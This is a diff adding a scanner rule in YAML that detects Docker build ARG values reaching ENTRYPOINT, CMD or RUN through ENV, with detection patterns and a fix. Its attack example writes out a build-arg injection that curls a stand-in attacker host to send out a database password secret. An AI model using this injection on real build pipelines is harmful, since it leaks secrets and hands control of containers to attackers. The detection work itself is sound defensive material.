@@ -1,0 +1,54 @@
+id: container-build-arg-to-entrypoint
+scanner_type: Container
+name: Docker Build ARG Injection to ENTRYPOINT Execution
+description: >
+  A Docker build ARG value is passed through ENV into the container's
+  ENTRYPOINT or CMD. An attacker who controls build arguments controls
+  what executes inside the container.
+cwe: CWE-78
+severity: High
+
+source:
+  type: DOCKER_BUILD_ARG
+  directive: ARG
+  attack_vector: >
+    Supplied via --build-arg at CI/CD build time, or via docker-compose
+    build.args section.
+
+store:
+  type: DOCKER_ENV
+  directive: ENV TERMINAL_APP=${TERMINAL_APP}
+  note: ENV persists the ARG into the container runtime
+
+sink:
+  type: DOCKER_ENTRYPOINT
+  patterns:
+    - 'ENTRYPOINT ["sh", "-c", "${VAR}"]'
+    - 'CMD ["sh", "-c", "${VAR}"]'
+    - 'RUN ${VAR}'
+
+detection: >
+  Parse Dockerfile as structured text. Trace ARG → ENV → ENTRYPOINT/CMD/RUN.
+  Flag any ENTRYPOINT that uses shell form with an ENV variable.
+
+attack_example: |
+  # Dockerfile:
+  ARG TERMINAL_APP=bash
+  ENV TERMINAL_APP=${TERMINAL_APP}
+  ENTRYPOINT ["sh", "-c", "${TERMINAL_APP}"]
+
+  # Attacker supplies:
+  docker build --build-arg TERMINAL_APP='curl https://exfil.attacker.com/$(cat /run/secrets/db_password)' .
+  # → Secret exfiltrated on container startup
+
+fix:
+  description: >
+    Never pass ARG values directly into ENTRYPOINT. Use fixed executables
+    with parameterized arguments only.
+  before: |
+    ARG APP_CMD=default-app
+    ENV APP_CMD=${APP_CMD}
+    ENTRYPOINT ["sh", "-c", "${APP_CMD}"]
+  after: |
+    ENTRYPOINT ["default-app", "--config", "/etc/app/config.json"]
+    # Configuration via files, not shell-interpolated env vars
